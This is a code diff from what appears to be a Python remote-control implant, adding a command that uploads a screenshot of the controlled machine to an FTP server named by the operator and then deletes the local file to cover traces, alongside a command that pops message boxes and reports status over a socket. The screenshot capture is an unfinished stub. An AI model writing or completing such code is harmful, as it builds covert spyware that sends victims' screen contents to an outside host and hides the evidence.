@@ -32,13 +32,24 @@ class messagebox:
         sock.sock.s.send("Box was opened\n")
         Box(None,args,"Message", 0)
         return "Message box was closed\n"
-class screenshot:
+class screenshot:# not ready for use yet
     def __init__(self):
         self.command = 'screenshot'
-        self.description = 'taking screenshot and uploading to ftp server with: screenshot <pass> <user> <server>'
+        self.description = 'taking screenshot and uploading to ftp server with: screenshot <pass> <user> <server>\n'
         self.args = True
     def main(self,args):
         args = args.split(" ")
         password = args[0]
         user = args[1]
         server = args[2]
+        session = ftplib.FTP(server,user,password)
+        sock.sock.s.send("SESSION OPENED\n")
+        #take screenshot and save to: 
+        sock.sock.s.send("SCREENSHOT TAKING FINISHED\n")
+        pic = open(screenshotfile,'rb')
+        session.storbinary("STOR pic.jpg",pic)
+        pic.close()
+        session.quit()
+        sock.sock.s.send("FILE UPLOADED BEGINNING CLEANUP\n")
+        proc = subprocess.Popen("del pic.jpg", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        return "CLEANUP FINISHED FILE UPLOADED\n"
